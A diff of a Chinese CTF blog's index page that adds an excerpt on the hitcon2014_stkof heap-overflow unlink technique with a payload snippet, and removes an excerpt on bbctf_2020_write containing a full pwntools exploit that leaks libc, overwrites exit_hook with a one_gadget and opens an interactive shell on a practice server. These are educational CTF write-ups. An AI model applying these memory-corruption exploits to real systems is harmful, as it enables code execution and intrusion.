@@ -206,6 +206,83 @@
             
 
   
+    <article id="post-hitcon2014-stkof" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+  
+  
+    <h1 itemprop="name">
+	
+	  <a class="article-title" href="/2024/03/16/hitcon2014-stkof/" target="_blank">hitcon2014_stkof</a>
+  
+    </h1>
+  
+
+
+  
+  
+<a href="/2024/03/16/hitcon2014-stkof/" class="archive-article-date">
+        <time datetime="2024-03-16T14:10:58.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-03-16</time>
+</a>
+
+  
+  
+    
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h5 id="偏移都没开，有个堆溢出漏洞，刚巧不久前做了一道堆溢出，但是做法对于这道题没什么用，没有show函数，没有偏移保护可以用unlink"><a href="#偏移都没开，有个堆溢出漏洞，刚巧不久前做了一道堆溢出，但是做法对于这道题没什么用，没有show函数，没有偏移保护可以用unlink" class="headerlink" title="偏移都没开，有个堆溢出漏洞，刚巧不久前做了一道堆溢出，但是做法对于这道题没什么用，没有show函数，没有偏移保护可以用unlink"></a>偏移都没开，有个堆溢出漏洞，刚巧不久前做了一道堆溢出，但是做法对于这道题没什么用，没有show函数，没有偏移保护可以用unlink</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x30</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x30</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x30</span>) <span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">bss=<span class="number">0x602140</span>+<span class="number">0x10</span></span><br><span class="line">fd=bss-<span class="number">0x18</span></span><br><span class="line">bk=bss-<span class="number">0x10</span></span><br><span class="line">payload=p32(<span class="number">0</span>)+p32(<span class="number">0x30</span>)</span><br><span class="line">payload+=p64(fd)+p64(bk)</span><br><span class="line">payload+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload+=p64(<span class="number">0x30</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i0.imgs.ovh/2024/03/15/eVoRI.png" alt="image-20240316223611733"></p>
+
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+    
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2024/03/16/hitcon2014-stkof/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-inndy-rop" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -923,89 +1000,6 @@
     
     <p class="article-more-link">
       <a class="article-more-a" href="/2024/03/08/mergeheap/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-bbctf-2020-write" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/2024/03/08/bbctf-2020-write/" target="_blank">bbctf_2020_write</a>
-  
-    </h1>
-  
-
-
-  
-  
-<a href="/2024/03/08/bbctf-2020-write/" class="archive-article-date">
-        <time datetime="2024-03-08T11:12:10.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-03-08</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
-    
-    <p><img src="https://i0.imgs.ovh/2024/03/07/QUp53.png" alt="image-20240308192349360"></p>
-<p><img src="https://i0.imgs.ovh/2024/03/07/QUMbe.png" alt="image-20240308192110221"> </p>
-<h5 id="可以泄露了puts-got-可以算偏移，程序可以改地址的内容，那么可以改exit-hook-exit函数会执行-run-exit-handlers，然后这个函数会调用-dl-fini，然后这个-dl-fini的源码调用了-rtld-lock-lock-recursive-和-rtld-lock-unlock-recursive，所以只需要向其中一个写入one-gadget就行了。"><a href="#可以泄露了puts-got-可以算偏移，程序可以改地址的内容，那么可以改exit-hook-exit函数会执行-run-exit-handlers，然后这个函数会调用-dl-fini，然后这个-dl-fini的源码调用了-rtld-lock-lock-recursive-和-rtld-lock-unlock-recursive，所以只需要向其中一个写入one-gadget就行了。" class="headerlink" title="可以泄露了puts_got,可以算偏移，程序可以改地址的内容，那么可以改exit_hook,exit函数会执行__run_exit_handlers，然后这个函数会调用_dl_fini，然后这个_dl_fini的源码调用了 __rtld_lock_lock_recursive 和 __rtld_lock_unlock_recursive，所以只需要向其中一个写入one_gadget就行了。"></a>可以泄露了puts_got,可以算偏移，程序可以改地址的内容，那么可以改exit_hook,exit函数会执行__run_exit_handlers，然后这个函数会调用_dl_fini，然后这个_dl_fini的源码调用了 __rtld_lock_lock_recursive 和 __rtld_lock_unlock_recursive，所以只需要向其中一个写入one_gadget就行了。</h5><h5 id="为了以后方便，以后就这样算"><a href="#为了以后方便，以后就这样算" class="headerlink" title="为了以后方便，以后就这样算"></a>为了以后方便，以后就这样算</h5><p><strong>在libc-2.23中</strong><br><strong>exit_hook &#x3D; libc_base+0x5f0040+3848</strong></p>
-<p><strong>exit_hook &#x3D; libc_base+0x5f0040+3856</strong></p>
-<p><strong>在libc-2.27中</strong></p>
-<p><strong>exit_hook &#x3D; libc_base+0x619060+3840</strong></p>
-<h5 id="exit-hook-libc-base-0x619060-3848"><a href="#exit-hook-libc-base-0x619060-3848" class="headerlink" title="exit_hook &#x3D; libc_base+0x619060+3848"></a>exit_hook &#x3D; libc_base+0x619060+3848</h5><h5 id="具体的exit-hook可以看这，然后用one-gadget-然后输入的话得用字符串格式"><a href="#具体的exit-hook可以看这，然后用one-gadget-然后输入的话得用字符串格式" class="headerlink" title="具体的exit_hook可以看这，然后用one_gadget.然后输入的话得用字符串格式"></a>具体的exit_hook可以看这，然后用one_gadget.然后输入的话得用字符串格式</h5><p>[exit_hook在pwn题中的应用](<a target="_blank" rel="noopener" href="http://www.manongjc.com/detail/21-aktzmrsypltrrll.html">exit_hook在pwn题中的应用 - 码农教程 (manongjc.com)</a>)</p>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">29131</span>)</span><br><span class="line"><span class="comment">#p=process(&quot;./bbctf_2020_write&quot;)</span></span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;puts: &#x27;</span>)</span><br><span class="line">puts_addr=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">base=puts_addr-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;put&#x27;</span>+<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">p.sendline(<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"></span><br><span class="line">exit_hook=base++<span class="number">0x619060</span>+<span class="number">3848</span></span><br><span class="line">one=[<span class="number">0x4f2c5</span>,<span class="number">0x4f322</span>,<span class="number">0x10a38c</span>]</span><br><span class="line">one_gadget=one[<span class="number">1</span>]+base</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;ptr: &#x27;</span>,<span class="built_in">str</span>(exit_hook))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;val: &#x27;</span>,<span class="built_in">str</span>(one_gadget))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;(q)uit&#x27;</span>,<span class="string">&#x27;q&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#sleep(1)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-
-    
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-    
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/2024/03/08/bbctf-2020-write/">展开全文 >></a>
     </p>
     
 
